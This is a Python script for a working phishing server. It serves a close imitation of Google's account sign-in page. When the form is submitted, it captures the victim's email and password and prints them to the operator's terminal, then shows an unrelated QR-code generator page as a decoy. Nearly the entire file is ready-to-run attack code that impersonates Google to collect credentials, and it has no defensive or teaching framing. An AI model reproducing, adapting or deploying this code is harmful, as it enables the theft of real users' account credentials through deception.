from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

HOST = "0.0.0.0"
PORT = 8080

# STAGE 1: The Initial Google Sign-in Layout Page
SIGNIN_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        html, body { height: 100%; margin: 0; padding: 0; background-color: #ffffff; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        * { box-sizing: border-box; font-family: 'Roboto', sans-serif; -webkit-font-smoothing: antialiased; }
        .login-box { width: 450px; padding: 48px 40px; border: 1px solid #dadce0; border-radius: 8px; background: #ffffff; }
        .center-header-wrapper { display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; width: 100%; margin-bottom: 24px; }
        .google-logo-img { height: 36px; width: auto; display: block; margin-bottom: 4px; }
        h2 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 4px; }
        .subtitle { font-size: 16px; color: #202124; margin-top: 0; }
        .input-container { position: relative; margin-bottom: 12px; }
        .input-container input { width: 100%; height: 56px; padding: 16px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; color: #202124; outline: none; background: transparent; }
        .input-container input:focus { border: 2px solid #1a73e8; padding: 15px; }
        .input-container label { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); background: #ffffff; padding: 0 4px; color: #5f6368; font-size: 16px; transition: 0.12s ease-out; pointer-events: none; }
        .input-container input:focus ~ label, .input-container input:not(:placeholder-shown) ~ label { top: 0; font-size: 12px; color: #1a73e8; }
        .links-container { text-align: left; margin-bottom: 24px; margin-top: 4px; }
        .blue-link { color: #1a73e8; text-decoration: none; font-size: 14px; }
        .font-medium { font-weight: 500; }
        .notice-text { font-size: 14px; color: #5f6368; text-align: left; line-height: 1.45; margin-bottom: 32px; }
        .action-row { display: flex; justify-content: space-between; align-items: center; margin-top: 24px; }
        .btn-next { background-color: #1a73e8; color: #ffffff; border: none; height: 36px; padding: 0 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background-color 0.1s; }
        .btn-next:hover { background-color: #1557b0; }
        .footer-bar { width: 450px; display: flex; justify-content: space-between; margin-top: 14px; font-size: 12px; color: #5f6368; }
        .language-dropdown { cursor: pointer; }
        .arrow-down { font-size: 8px; margin-left: 4px; vertical-align: middle; }
        .footer-links a { color: #5f6368; text-decoration: none; margin-left: 16px; }
        @media (max-width: 500px) { .login-box, .footer-bar { width: 100%; border: none; padding: 24px; } }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="center-header-wrapper">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="google-logo-img">
            <h2>Sign in</h2>
            <p class="subtitle">with your Google Account</p>
        </div>
        <form id="loginForm" action="" method="POST">
            <div class="input-container">
                <input type="email" id="email" name="identifier" required placeholder=" " autofocus>
                <label for="email">Email or phone</label>
            </div>
            <div class="input-container">
                <input type="password" id="password" name="secret_key" required placeholder=" ">
                <label for="password">Enter your password</label>
            </div>
            <div class="links-container">
                <a href="#" class="blue-link font-medium">Forgot password?</a>
            </div>
            <p class="notice-text">
                Not your computer? Use Guest mode to sign in privately. <a href="#" class="blue-link">Learn more</a>
            </p>
            <div class="action-row">
                <a href="#" class="blue-link font-medium">Create account</a>
                <button type="submit" class="btn-next" id="nextBtn">Next</button>
            </div>
        </form>
    </div>
    <div class="footer-bar">
        <div class="language-dropdown">English (United States) <span class="arrow-down">▼</span></div>
        <div class="footer-links">
            <a href="#">Help</a>
            <a href="#">Privacy Policy</a>
            <a href="#">Terms of Service</a>
        </div>
    </div>
</body>
</html>
"""

# STAGE 2: The QR Code Generator Page served immediately after hitting "Next"
QR_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ultra HD QR Generator</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/qrious/4.0.2/qrious.min.js"></script>
<style>
    *{ box-sizing:border-box; }
    body{ margin:0; padding:20px; min-height:100vh; display:flex; justify-content:center; align-items:center; background:#f5f7fa; font-family:Segoe UI,Roboto,sans-serif; }
    .card{ width:100%; max-width:520px; background:white; padding:30px; border-radius:20px; box-shadow:0 10px 40px rgba(0,0,0,0.12); text-align:center; }
    h2{ margin-top:0; color:#202124; }
    input[type="text"]{ width:100%; padding:14px; margin:12px 0; border:1px solid #dadce0; border-radius:10px; font-size:16px; }
    .file-input{ text-align:left; margin:18px 0; color:#5f6368; font-size:14px; }
    canvas{ width:100% !important; height:auto !important; margin-top:20px; border-radius:14px; border:1px solid #eee; image-rendering:pixelated; image-rendering:crisp-edges; }
    button{ width:100%; padding:15px; margin-top:18px; border:none; border-radius:12px; background:#34a853; color:white; font-size:16px; font-weight:bold; cursor:pointer; }
    button:active{ transform:scale(0.98); }
    #status{ margin-top:10px; min-height:20px; color:#1a73e8; font-size:13px; }
</style>
</head>
<body>
<div class="card">
    <h2>Ultra HD QR Generator</h2>
    <input type="text" id="qr-text" placeholder="Enter URL or Text" oninput="generateQR()">
    <div class="file-input">
        <label>Upload Logo:</label><br><br>
        <input type="file" id="logo-upload" accept="image/*" onchange="generateQR()">
    </div>
    <canvas id="qr-canvas"></canvas>
    <div id="status"></div>
    <button onclick="downloadQR()">Download Ultra HD PNG</button>
</div>
<script>
function generateQR(){
    const text = document.getElementById('qr-text').value || 'https://hadrielcs.github.io';
    const canvas = document.getElementById('qr-canvas');
    const logoUpload = document.getElementById('logo-upload');
    const status = document.getElementById('status');
    const renderSize = 4096;
    canvas.width = renderSize;
    canvas.height = renderSize;
    const ctx = canvas.getContext('2d');
    ctx.imageSmoothingEnabled = false;
    new QRious({
        element: canvas,
        value: text,
        size: renderSize,
        level: 'H',
        foreground: '#000000',
        background: '#ffffff'
    });
    if(logoUpload.files && logoUpload.files[0]){
        status.innerText = 'Processing Ultra HD Logo...';
        const reader = new FileReader();
        reader.onload = function(e){
            const img = new Image();
            img.onload = function(){
                const logoWidth = renderSize * 0.18;
                const logoHeight = logoWidth * 1.45;
                const centerX = (renderSize - logoWidth) / 2;
                const centerY = (renderSize - logoHeight) / 2;
                const padding = renderSize * 0.03;
                const radius = 70;
                ctx.fillStyle = '#ffffff';
                ctx.beginPath();
                ctx.roundRect(centerX - padding, centerY - padding, logoWidth + (padding * 2), logoHeight + (padding * 2), radius);
                ctx.fill();
                ctx.imageSmoothingEnabled = true;
                ctx.imageSmoothingQuality = 'high';
                ctx.drawImage(img, centerX, centerY, logoWidth, logoHeight);
                status.innerText = 'Ultra HD QR Ready!';
            };
            img.src = e.target.result;
        };
        reader.readAsDataURL(logoUpload.files[0]);
    }else{
        status.innerText = 'Ultra HD QR Ready!';
    }
}
function downloadQR(){
    const canvas = document.getElementById('qr-canvas');
    const link = document.createElement('a');
    link.href = canvas.toDataURL('image/png');
    link.download = 'Ultra_HD_QR.png';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}
window.onload = generateQR;
</script>
</body>
</html>
"""

class MyServer(BaseHTTPRequestHandler):

    def do_GET(self):
        # Serves the Google Sign-in layout page initially
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(SIGNIN_PAGE.encode())

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode()

        # Parse form data parameters
        data = parse_qs(post_data)

        # Pull out values
        identifier = data.get("identifier", [""])[0]
        secret_key = data.get("secret_key", [""])[0]

        # Logs values safely to the local terminal console
        print("\n--- SERVER TERMINAL RECEPTION LOG ---")
        print(f"Email or Phone: {identifier}")
        print(f"Password: {secret_key}")
        print("--------------------------------------\n")

        # Technical Change: Instead of sending plain confirmation text, 
        # we respond by dynamically sending the complete QR Generator HTML string.
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(QR_PAGE.encode())

if __name__ == "__main__":
    server = HTTPServer((HOST, PORT), MyServer)
    print(f"Server running locally at http://localhost:{PORT}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nServer shutting down clean.")
        server.server_close()
